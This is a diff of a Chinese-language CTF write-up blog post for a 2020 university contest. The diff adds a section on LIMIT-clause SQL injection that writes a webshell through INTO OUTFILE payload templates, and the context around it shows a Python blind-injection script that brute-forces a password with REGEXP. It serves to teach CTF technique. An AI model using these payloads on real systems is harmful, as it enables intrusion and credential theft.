@@ -132,10 +132,13 @@
 <meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_1.png">
 <meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_2.png">
 <meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_3.png">
+<meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_1.png">
+<meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_2.png">
+<meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_3.png">
 <meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_1.png">
 <meta property="og:image" content="https://0xfire.github.io/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_2.png">
 <meta property="article:published_time" content="2020-06-30T15:00:00.000Z">
-<meta property="article:modified_time" content="2020-06-30T14:25:01.855Z">
+<meta property="article:modified_time" content="2020-07-01T16:39:12.872Z">
 <meta property="article:author" content="0xfire">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -402,7 +405,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  834
+                  1k
                 </span>
               
 
@@ -418,7 +421,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  3
+                  4
                 </span>
               
             </div>
@@ -495,6 +498,16 @@
 <p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_2.png" alt="0x08_2.png"></p>
 <p>然后直接使用cat来读取 <code>* ../*</code></p>
 <p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_3.png" alt="0x08_3.png"></p>
+<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>这里听群里的师傅说是limit注入写文件，查了一下官方文档</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_1.png" alt="0x10_1.png"></p>
+<p>在设置了secure_file_priv的情况下，就可以直接写shell了，猜一个路径(通常就是/var/www/html)</p>
+<p>贴几个payload。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines terminated <span class="keyword">by</span>  （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> fields terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> <span class="keyword">columns</span> terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines starting <span class="keyword">by</span>    （一句话hex编码）</span><br></pre></td></tr></table></figure>
+
+<p>至于某群友说低版本才行，经过查阅文档发现都行，上图就是mysql8.0的文档，所以总结就是只要能够写文件，就能limit后面进行注入(有错误的话欢迎师傅们指正)。</p>
+<p>以下为测试的两个版本，只需要开启secure-file-priv就可以进行limit写shell了</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_2.png" alt="0x10_2.png"></p>
+<p> <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_3.png" alt="0x10_3.png"> </p>
 <h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>目录扫描到wwwroot.zip，发现过滤的比较死，猜测账号密码图片都在同一个数据库表中，脚本如下。</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="selector-tag">a</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="title">while</span><span class="params">(<span class="number">1</span>)</span></span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="selector-tag">a</span>:</span><br><span class="line">        url = <span class="string">'http://23dcf1dc.yunyansec.com/picture.php?id=3" or password REGEXP '</span>+<span class="string">'\'^'</span>+temp+i+<span class="string">'\' %23'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'not found'</span> not <span class="keyword">in</span> r<span class="selector-class">.text</span>:</span><br><span class="line">            temp = temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
@@ -503,8 +516,6 @@
 <p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_2.png" alt="0x09_2.png"></p>
 <p> 然后登陆拿到flag </p>
 <h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>总体来说还算比较简单，早期起来晚了，要不然还能抢几个题，等我起来一上号队友都已经在屠榜了(淦</p>
-<p>最后……分析代码得flag也是原题，链接：</p>
-<p> <a href="https://github.com/XDSEC/xdsec_ctf/tree/494b53d388186e8be21e753bb2048362842280c1/xdctf2015/izyCTF" target="_blank" rel="noopener">https://github.com/XDSEC/xdsec_ctf/tree/494b53d388186e8be21e753bb2048362842280c1/xdctf2015/izyCTF</a></p>
 
       
     </div>
@@ -758,7 +769,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-赛题"><span class="nav-text">0x01 赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#签到"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行基础"><span class="nav-text">命令执行基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#你能爆破吗？"><span class="nav-text">你能爆破吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含getshell"><span class="nav-text">文件包含getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#成绩单"><span class="nav-text">成绩单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小猫咪踩灯泡"><span class="nav-text">小猫咪踩灯泡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析代码获得flag"><span class="nav-text">分析代码获得flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入2"><span class="nav-text">SQL注入2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-总结"><span class="nav-text">0x02 总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-赛题"><span class="nav-text">0x01 赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#签到"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行基础"><span class="nav-text">命令执行基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#你能爆破吗？"><span class="nav-text">你能爆破吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含getshell"><span class="nav-text">文件包含getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#成绩单"><span class="nav-text">成绩单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小猫咪踩灯泡"><span class="nav-text">小猫咪踩灯泡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析代码获得flag"><span class="nav-text">分析代码获得flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入1"><span class="nav-text">SQL注入1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入2"><span class="nav-text">SQL注入2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-总结"><span class="nav-text">0x02 总结</span></a></li></ol></div>
             
 
           </div>
